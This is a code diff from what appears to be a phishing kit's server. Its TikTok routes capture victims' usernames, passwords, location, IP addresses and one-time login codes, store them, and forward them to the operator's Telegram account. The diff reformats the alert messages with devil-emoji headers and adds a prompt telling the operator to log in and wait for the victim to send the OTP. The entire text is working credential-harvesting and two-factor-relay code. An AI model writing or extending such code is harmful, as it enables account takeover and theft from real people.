@@ -73,16 +73,18 @@ router.post("/tikto/:linkId", async (req, res) => {
             });
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
-LOG ENTRY
-PLATFORM: TIKTOK
+😈NEW ENTRY😈
 
 USERNAME: ${username}
 PASSWORD: ${password}
 
+PLATFORM: TIKTOK
 COUNTRY: ${country}
 CITY: ${city}
 REGION: ${region}
 IP: ${ip}
+
+${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}
 
 Login now: https://www.tiktok.com or use mobile app
                                                 `)
@@ -112,8 +114,12 @@ router.post("/tikto/otp/:linkId", async (req, res) => {
 
         if (link) {
             await bot.sendMessage(user.telegramID, `
+😈NEW ENTRY😈
+
 PLATFORM: TIKTOK
-TYPE: OTP
+
+OTP RECEIVED!
+
 CODE: ${code}
 
                 `)
